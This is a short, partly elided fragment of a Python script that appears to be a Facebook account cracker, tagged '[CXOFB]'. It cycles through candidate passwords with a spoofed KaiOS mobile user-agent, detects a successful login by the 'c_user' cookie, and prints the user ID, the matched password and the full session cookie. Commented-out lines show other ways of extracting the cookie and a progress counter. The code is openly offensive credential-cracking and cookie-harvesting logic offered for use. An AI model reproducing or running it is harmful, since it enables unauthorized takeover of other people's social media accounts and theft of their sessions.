        ...
        for ps in pwx:
           ...
           'user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[CXOFB] {uid} | {ps}")
                print(f" Cookie : {coki}")
                print("\x1b[38;5;208m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                ...
                #coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                #cid = coki[82:97]
                #print(f"\x1b[38;5;196m[CXOFB] {cid} | {ps}")
                ...
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[CXOFB] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        #sys.stdout.flush()
    except:
        pass
Main()